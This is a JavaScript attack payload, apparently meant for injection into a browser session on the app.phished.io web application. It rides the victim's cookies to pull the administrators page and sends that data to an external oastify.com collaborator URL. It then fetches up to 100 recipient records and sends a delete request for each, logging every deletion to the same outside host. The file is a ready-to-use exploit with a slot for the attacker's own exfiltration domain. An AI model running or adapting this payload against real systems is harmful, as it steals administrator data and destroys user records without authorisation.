// CONFIGURE YOUR EXFIL DOMAIN HERE:
const exfilURL = 'https://2bep0qswkxqv024bsq98modjza51tsjg8.oastify.com/log';

(async () => {
  try {
    // 1. Exfiltrate Admins
    const adminRes = await fetch('https://app.phished.io/en/users/administrators', {
      credentials: 'include'
    });
    const adminData = await adminRes.text();
    await fetch(exfilURL, {
      method: 'POST',
      body: '[ADMINS]\n' + adminData,
      headers: { 'Content-Type': 'text/plain' },
      credentials: 'include'
    });

    // 2. Get Recipients, Extract IDs, Delete
    const recipientsRes = await fetch('https://app.phished.io/recipients/datatables/list?draw=1&start=0&length=100', {
      credentials: 'include'
    });
    const data = await recipientsRes.json();
    
    for (const user of data.data) {
      const id = user.Recipient_ID;
      if (id) {
        // Delete user
        await fetch(`https://app.phished.io/en/users/recipients/${id}/delete`, {
          credentials: 'include'
        });

        // Optional: Log deletion
        await fetch(exfilURL, {
          method: 'POST',
          body: `[DELETED] ${id}`,
          headers: { 'Content-Type': 'text/plain' },
          credentials: 'include'
        });
      }
    }
  } catch (e) {
    // Optional error handling
  }
})();
